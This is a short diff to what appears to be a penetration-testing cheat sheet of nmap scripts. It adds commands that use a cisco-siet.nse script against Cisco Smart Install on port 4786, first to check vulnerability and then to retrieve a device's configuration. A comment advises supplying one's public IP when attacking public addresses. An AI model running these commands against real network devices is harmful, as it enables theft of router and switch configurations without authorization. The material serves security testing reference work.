@@ -295,9 +295,14 @@ _Attempts to guess valid credentials for the Citrix PN Web Agent XML Service_ Th
      |_  Jane:secret => Account is disabled
 
 
+### Cisco - Cvs - Test whether host is vulnerable or not
 
+    nmap -p 4786 -v 192.168.0.1	# By default, it will just test whether host is vulnerable or not
+    nmap -p 4786 -v 192.168.0.1 --script ./cisco-siet.nse
 
-
+### You can pass argument to get config
+# If you are attacking public ip, make sure to provide your public ip to the script (cisco-siet.addr=<PUBLIC_IP>)
+    nmap -p 4786 -v 192.168.0.1 --script ./cisco-siet.nse --script-args "cisco-siet.get"
 
 
 ### Cvs - Brute-Force
